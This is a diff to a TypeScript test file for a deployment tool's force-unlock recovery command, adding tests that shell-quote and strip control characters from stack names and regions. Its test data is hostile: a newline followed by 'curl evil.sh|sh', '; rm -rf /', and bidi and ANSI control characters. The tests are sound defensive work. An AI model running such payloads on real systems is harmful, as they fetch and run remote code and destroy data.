@@ -56,6 +56,39 @@ describe('buildForceUnlockCommand (issue #2170)', () => {
     expect(cmd).toContain(`--profile 'my prod'`);
   });
 
+  it('quotes any tilde — the class deliberately does not carry it', () => {
+    // `~` was briefly in the safe class for `Parent~Child` (every nested-stack
+    // child name). It came back OUT: that widening was only needed while the
+    // command was wrapped in `'...'`, and with the wrapper gone a quoted
+    // `'Root~Child'` pastes fine — so the class bought nothing while exposing
+    // tilde expansion on a value an S3 key can carry.
+    expect(buildForceUnlockCommand('Root~Child', 'us-east-1')).toContain(
+      `cdkd force-unlock 'Root~Child'`
+    );
+    expect(buildForceUnlockCommand('~Child', 'us-east-1')).toContain(
+      `cdkd force-unlock '~Child'`
+    );
+  });
+
+  it('emits NO command when a value has nothing renderable left', () => {
+    // `--stack-region ''` is FALSY to force-unlock, which treats it as
+    // "not supplied" and widens the release to EVERY region holding the stack
+    // name. Suggesting nothing is the honest answer.
+    expect(buildForceUnlockCommand('MyStack', '\u0000\u0001')).toBe('');
+    expect(buildForceUnlockCommand('\u0000', 'us-east-1')).toBe('');
+  });
+
+  it('strips the control classes a C0-only denylist misses', () => {
+    // U+0085 NEL, the C1 range, the line/paragraph separators (this string is
+    // PERSISTED and re-rendered by JSON viewers) and the bidi overrides, which
+    // visually reorder the command being pasted.
+    for (const hostile of ['\u0085', '\u009b', '\u2028', '\u2029', '\u202e', '\u2066']) {
+      const cmd = buildForceUnlockCommand(`My${hostile}Stack`, 'us-east-1');
+      expect(cmd, `not stripped: U+${hostile.codePointAt(0)!.toString(16)}`).not.toContain(hostile);
+    }
+  });
+
+
   it('escapes an embedded single quote instead of ending the quoted run', () => {
     const cmd = buildForceUnlockCommand('MyStack', 'us-east-1', { statePrefix: `it's` });
     // The POSIX close-escape-reopen form; pasting this yields the literal value.
@@ -65,6 +98,19 @@ describe('buildForceUnlockCommand (issue #2170)', () => {
 
 describe('buildLockContentionMessage (issue #2170)', () => {
   const base = { stackName: 'MyStack', region: 'us-east-1' };
+
+  it('tolerates a non-string owner instead of silently degrading', async () => {
+    // `getLockInfo` is `JSON.parse(body) as LockInfo`, so a hand-written
+    // lock.json can carry a number here. `value.replace` used to throw INTO the
+    // best-effort catch AFTER the "still running" flag had been set, pairing
+    // the confident advice with the evidence-free wording.
+    const msg = await buildLockContentionMessage({
+      ...base,
+      lockManager: lockManagerReturning({ owner: 12345, expiresAt: Date.now() + 60_000 }),
+    });
+    expect(msg).toContain('held by 12345');
+    expect(msg).toContain('That process is still running');
+  });
 
   it('names the holder, the operation and the expiry', async () => {
     // The finding this closes: the message asked the user to decide whether
@@ -201,7 +247,7 @@ describe('buildLockContentionMessage (issue #2170)', () => {
       subject: 'nested-stack child',
       recovery: { profile: 'my prod' },
     });
-    expect(msg).toContain('cdkd force-unlock Root~Child --stack-region us-east-1');
+    expect(msg).toContain(`cdkd force-unlock 'Root~Child' --stack-region us-east-1`);
     expect(msg).toContain(`--profile 'my prod'`);
     // No stray outer quote wrapping the whole command.
     expect(msg).not.toContain(`run 'cdkd force-unlock`);
@@ -213,9 +259,30 @@ describe('buildLockContentionMessage (issue #2170)', () => {
     const cmd = buildForceUnlockCommand('MyStack', 'us-east-1\ncurl evil.sh|sh');
     // Sanitized BEFORE quoting: quoting alone would neutralize the injection
     // but leave a multi-line "recovery command" on the terminal.
-    expect(cmd).not.toContain('\n');
-    expect(cmd).toContain('--stack-region');
     expect(cmd.split('\n')).toHaveLength(1);
+  });
+
+  it('QUOTES a hostile region that carries no control character', async () => {
+    // The sanitize half and the quote half must BOTH be fenced: the newline
+    // case above passes under sanitization alone, so dropping `shellQuote`
+    // around the region would leave it green. A `;`-bearing value has nothing
+    // to sanitize and is neutralized only by the quoting.
+    const cmd = buildForceUnlockCommand('MyStack', 'us-east-1; rm -rf /');
+    expect(cmd).toContain(`--stack-region 'us-east-1; rm -rf /'`);
+  });
+
+  it('sanitizes the PROSE head too, not only the command', async () => {
+    // `region` reaches the message twice. Sanitizing only inside
+    // `buildForceUnlockCommand` left the head able to render a multi-line
+    // message from a `\n`-bearing state.region.
+    const msg = await buildLockContentionMessage({
+      lockManager: lockManagerReturning(null),
+      stackName: 'My\u001b[2KStack',
+      region: 'us-east-1\nFORGED',
+      recovery: {},
+    });
+    expect(msg.split('\n')).toHaveLength(1);
+    expect(msg).not.toContain('\u001b');
   });
 
   it('omits --state-prefix when it is the default', async () => {
